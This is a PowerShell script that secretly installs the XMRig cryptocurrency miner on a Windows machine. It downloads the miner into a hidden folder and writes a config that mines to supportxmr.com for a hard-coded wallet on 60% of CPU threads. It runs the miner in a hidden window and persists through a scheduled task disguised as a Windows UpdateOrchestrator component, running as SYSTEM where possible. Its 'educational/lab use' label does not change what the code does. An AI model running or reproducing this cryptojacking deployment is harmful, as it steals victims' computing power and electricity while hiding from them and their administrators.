# ================================================
# XMRig Debug Deploy Script - FULL LOGGING VERSION
# For educational/lab use only
# Runs in one line, silent, persistent, 60% threads
# ================================================

$LogFile = "C:\Windows\Temp\xmr_deploy_debug.log"

function Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp | $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
    Write-Host "$Timestamp | $Message" -ForegroundColor Cyan
}

Log "=== XMRig DEBUG DEPLOYMENT STARTED ==="

# 1. Create hidden install directory
$InstallDir = "C:\ProgramData\XMRUpdate"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes = "Hidden"
}
Log "Install directory created (hidden): $InstallDir"

# 2. Download latest XMRig (v6.25.0 - March 2026)
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-debug.zip"

try {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 30
    Log "Download completed successfully"
} catch {
    Log "ERROR downloading: $($_.Exception.Message)"
    throw
}

# 3. Extract
try {
    Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
    Log "Extraction completed"
} catch {
    Log "ERROR extracting: $($_.Exception.Message)"
    throw
}

# 4. Clean zip and move files to root if inside subfolder
Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
$SubFolder = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "xmrig*" } | Select-Object -First 1
if ($SubFolder) {
    Move-Item "$($SubFolder.FullName)\*" $InstallDir -Force
    Remove-Item $SubFolder.FullName -Recurse -Force
    Log "Files moved from subfolder to root"
}

# 5. Locate xmrig.exe
$ExePath = Get-ChildItem -Path $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1 -ExpandProperty FullName
if (-not $ExePath) {
    Log "ERROR: xmrig.exe not found after extraction!"
    throw "xmrig.exe missing"
}
Log "XMRig executable found: $ExePath"

# 6. Create config.json (60% threads, your wallet, supportxmr pool with TLS)
$Config = @{
    autosave       = $false
    background     = $false
    colors         = $false
    cpu            = @{
        enabled          = $true
        "max-threads-hint" = 60
    }
    "donate-level" = 0
    "log-file"     = $null
    pools          = @(
        @{
            algo         = "rx/0"
            url          = "pool.supportxmr.com:443"
            user         = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
            pass         = "x"
            keepalive    = $true
            tls          = $true
            "rig-id"     = $env:COMPUTERNAME
        }
    )
    "print-time"   = 60
    retries        = 5
    "retry-pause"  = 5
} | ConvertTo-Json -Depth 10

$ConfigPath = "$InstallDir\config.json"
$Config | Out-File -FilePath $ConfigPath -Encoding UTF8 -Force
Log "config.json created with 60% threads and your wallet"

# 7. Start miner immediately (hidden)
try {
    Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden -NoNewWindow
    Log "Miner started immediately in background"
} catch {
    Log "ERROR starting miner: $($_.Exception.Message)"
}

# 8. Create persistence (Scheduled Task)
$TaskName = "Microsoft\Windows\UpdateOrchestrator\USOWorker"

try {
    # Try SYSTEM + AtStartup (requires admin)
    $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
    $Trigger   = New-ScheduledTaskTrigger -AtStartup
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings  = New-ScheduledTaskSettingsSet -Hidden $true -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
    Log "SUCCESS: Persistence created as SYSTEM at startup"
} catch {
    Log "SYSTEM task failed (no admin?): $($_.Exception.Message)"
    Log "Trying fallback (current user + AtLogOn)..."

    # Fallback
    $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
    $Trigger   = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    $Settings  = New-ScheduledTaskSettingsSet -Hidden $true -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero)

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
    Log "Fallback persistence created (runs at user logon)"
}

Log "=== XMRig DEBUG DEPLOYMENT FINISHED SUCCESSFULLY ==="
Log "Log file: $LogFile"
Log "Check running miner: tasklist | findstr xmrig"
Log "Check task: schtasks /query /tn `"$TaskName`""
